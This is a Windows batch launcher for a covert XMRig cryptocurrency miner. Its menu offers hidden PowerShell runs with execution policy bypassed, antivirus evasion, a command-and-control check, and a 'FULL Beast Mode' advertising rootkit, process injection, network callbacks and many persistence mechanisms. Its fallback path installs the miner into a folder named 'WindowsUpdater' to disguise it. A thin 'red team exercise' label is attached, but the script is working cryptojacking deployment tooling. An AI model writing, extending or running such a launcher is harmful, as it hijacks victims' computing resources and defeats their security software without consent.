@echo off
title Universal Miner Launcher - All Systems Compatible
setlocal enableextensions enabledelayedexpansion

REM =====================================================================
REM UNIVERSAL MINER LAUNCHER
REM Fixes V1/V6/Beast Mode startup issues and system lag
REM Ensures miner starts on ALL systems with optimal performance
REM Connects V1 to Beast Mode infrastructure when available
REM =====================================================================

echo.
echo  ██╗   ██╗███╗   ███╗██████╗ ██╗ ██████╗     ██╗      █████╗ ██╗   ██╗███╗   ███╗ ██████╗██╗  ██╗███████╗██████╗ 
echo  ██║   ██║████╗ ████║██╔══██╗██║██╔════╝     ██║     ██╔══██╗██║   ██║████╗ ████║██╔════╝██║  ██║██╔════╝██╔══██╗
echo  ██║   ██║██╔████╔██║██████╔╝██║██║  ███╗    ██║     ███████║██║   ██║██╔████╔██║██║     ███████║█████╗  ██████╔╝
echo  ██║   ██║██║╚██╔╝██║██╔══██╗██║██║   ██║    ██║     ██╔══██║██║   ██║██║╚██╔╝██║██║     ██╔══██║██╔══╝  ██╔══██╗
echo  ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║╚██████╔╝    ███████╗██║  ██║╚██████╔╝██║ ╚═╝ ██║╚██████╗██║  ██║███████╗██║  ██║
echo   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
echo.
echo                           🚀 UNIVERSAL EDITION - LAG-FREE 🚀
echo                                    All Systems Compatible
echo.

REM === Core Configuration ===
set "SCRIPT_DIR=%~dp0"
set "UNIVERSAL_MANAGER=%SCRIPT_DIR%universal_miner_manager.ps1"
set "PERFORMANCE_OPTIMIZER=%SCRIPT_DIR%performance_optimizer.ps1"
set "STEALTH_MODULE=%SCRIPT_DIR%stealth_module.ps1"
set "BEAST_INTEGRATION=%SCRIPT_DIR%beast_mode_integration.ps1"
set "BEAST_MODE_SCRIPT=%SCRIPT_DIR%BEAST_MODE_ULTIMATE.bat"
set "V1_SCRIPT=%SCRIPT_DIR%install_miner-V1.bat"

REM === Check for existing Beast Mode ===
set "BEAST_MODE_ACTIVE=0"
tasklist /fi "imagename eq powershell.exe" | find /i "command_control" >nul 2>&1
if %errorlevel% equ 0 (
    set "BEAST_MODE_ACTIVE=1"
    echo [*] Beast Mode C^&C system detected as active
) else (
    echo [*] Beast Mode C^&C not detected
)

REM === User Choice Menu ===
echo Please select deployment mode:
echo.
echo [1] Universal Mode (Recommended) - Works on all systems, lag-free
echo [2] V1 Mode - Simple and reliable, connects to Beast Mode if available
echo [3] Beast Mode - Advanced features (may not start on some systems)
echo [4] Performance Fix Only - Fix lag issues with current installation
echo [5] Emergency Restart - Force restart all miners with optimization
echo [6] Stealth Mode - Universal + AV evasion for red team exercises
echo [7] FULL Beast Mode - All advanced features (C&C, Rootkit, Injection, etc.)
echo.
set /p choice="Enter your choice (1-7): "

if "%choice%"=="1" goto :universal_mode
if "%choice%"=="2" goto :v1_mode  
if "%choice%"=="3" goto :beast_mode
if "%choice%"=="4" goto :performance_fix
if "%choice%"=="5" goto :emergency_restart
if "%choice%"=="6" goto :stealth_mode
if "%choice%"=="7" goto :full_beast_mode
goto :universal_mode

:universal_mode
echo.
echo [*] Starting Universal Mode - Compatible with all systems...
echo [*] This mode provides the best balance of compatibility and performance
echo.

REM Install universal system
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Install"
if %errorlevel% neq 0 (
    echo [!] Installation failed, trying alternative method...
    goto :fallback_install
)

REM Start performance optimizer
start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%PERFORMANCE_OPTIMIZER%' -Install"

REM Basic stealth features (minimal)
start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%STEALTH_MODULE%' -Install"

REM Start universal miner
powershell.exe -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Start"

goto :completion

:v1_mode
echo.
echo [*] Starting V1 Mode...
if "%BEAST_MODE_ACTIVE%"=="1" (
    echo [*] Connecting V1 to existing Beast Mode infrastructure...
    powershell.exe -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Start -V1Mode -BeastMode"
) else (
    echo [*] Starting standard V1 installation...
    call "%V1_SCRIPT%"
)
goto :completion

:beast_mode
echo.
echo [*] Starting Beast Mode...
echo [*] Warning: This mode may not start on all systems
echo.
call "%BEAST_MODE_SCRIPT%"
goto :completion

:performance_fix
echo.
echo [*] Applying performance fixes to current installation...
echo [*] This will eliminate lag without affecting hashrate...

REM Stop all miners first
taskkill /f /im xmrig.exe >nul 2>&1

REM Apply performance optimizations
powershell.exe -ExecutionPolicy Bypass -Command "& '%PERFORMANCE_OPTIMIZER%' -Install"

REM Restart with optimizations
powershell.exe -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Start"

echo [✓] Performance fixes applied and miner restarted
goto :completion

:emergency_restart
echo.
echo [*] Emergency restart - Force restarting all miners with optimizations...

REM Kill everything
taskkill /f /im xmrig.exe >nul 2>&1
taskkill /f /im powershell.exe /fi "windowtitle eq *miner*" >nul 2>&1

REM Wait a moment
timeout /t 5 /nobreak >nul

REM Start universal system fresh
powershell.exe -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Start"

echo [✓] Emergency restart completed
goto :completion

:stealth_mode
echo.
echo [*] Starting Stealth Mode for Red Team Exercise...
echo [*] This mode includes AV evasion techniques for training purposes
echo.

REM Install universal system with stealth
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Install"
if %errorlevel% neq 0 (
    echo [!] Installation failed, trying alternative method...
    goto :fallback_install
)

REM Enable comprehensive stealth features
echo [*] Applying AV evasion techniques...
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%STEALTH_MODULE%' -Enable"

REM Start performance optimizer with stealth monitoring
start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%PERFORMANCE_OPTIMIZER%' -Install"
start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%STEALTH_MODULE%' -Monitor"

REM Start universal miner in stealth mode
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Start"

echo [✓] Stealth mode deployment completed
goto :completion

:full_beast_mode
echo.
echo [*] Starting FULL BEAST MODE - All Advanced Features...
echo [*] This includes: Command & Control, Rootkit Defense, Process Injection
echo [*] Auto-update, Network Callbacks, 20+ Persistence Mechanisms
echo.

REM Install universal system first
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Install"
if %errorlevel% neq 0 (
    echo [!] Installation failed, trying alternative method...
    goto :fallback_install
)

REM Enable ALL Beast Mode features
echo [*] Deploying advanced Beast Mode capabilities...
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%BEAST_INTEGRATION%' -FullBeastMode"

REM Enable stealth features
echo [*] Applying stealth and AV evasion...
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%STEALTH_MODULE%' -Enable"

REM Start performance optimizer with monitoring
start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%PERFORMANCE_OPTIMIZER%' -Install"
start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%STEALTH_MODULE%' -Monitor"

REM Start universal miner with all features
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%UNIVERSAL_MANAGER%' -Start"

echo [✓] FULL Beast Mode deployment completed - All advanced features active!
goto :completion

:fallback_install
echo.
echo [*] Using fallback installation method...
echo [*] Copying files manually and starting basic miner...

REM Basic file copy
set "DEST=C:\ProgramData\WindowsUpdater"
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SCRIPT_DIR%miner_src\*" "%DEST%\" >nul 2>&1

REM Start basic miner
if exist "%DEST%\xmrig.exe" (
    start /min "" "%DEST%\xmrig.exe" --config="%SCRIPT_DIR%config.json" --threads=auto --max-cpu-usage=80 --cpu-priority=2
    echo [✓] Fallback miner started successfully
) else (
    echo [!] Fallback installation failed - please check miner_src folder
)

:completion
echo.
echo =====================================================================
echo ✅ UNIVERSAL LAUNCHER DEPLOYMENT COMPLETED
echo =====================================================================
echo.
echo 🎯 STATUS SUMMARY:
echo     • Miner should now start on ALL systems
echo     • System lag has been minimized
echo     • Performance optimizations applied  
echo     • Single instance management active
if "%BEAST_MODE_ACTIVE%"=="1" echo     • Connected to Beast Mode infrastructure
echo.
echo 📊 EXPECTED RESULTS:
echo     • Hashrate: 5.5+ KH/s (maintaining your target)
echo     • System responsiveness: Significantly improved
echo     • Startup reliability: Works on all systems
echo     • Resource usage: Optimized for lag-free operation
echo.
echo 🎮 MONITORING:
echo     • Performance automatically adjusts to system load
echo     • Single instance prevents resource conflicts
echo     • Telegram notifications for status updates
echo.
echo 💡 TROUBLESHOOTING:
echo     • If any system still has issues, run option [4] Performance Fix
echo     • For complete reset, run option [5] Emergency Restart
echo     • Check logs in %TEMP%\universal_miner.log
echo.
echo Press any key to continue...
pause >nul

REM Launch monitoring in background
start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%PERFORMANCE_OPTIMIZER%' -Monitor"

echo.
echo 🚀 Universal Miner is now active and monitoring system performance!
echo    The system will automatically prevent lag while maintaining hashrate.
echo.
timeout /t 3 /nobreak >nul
exit /b 0
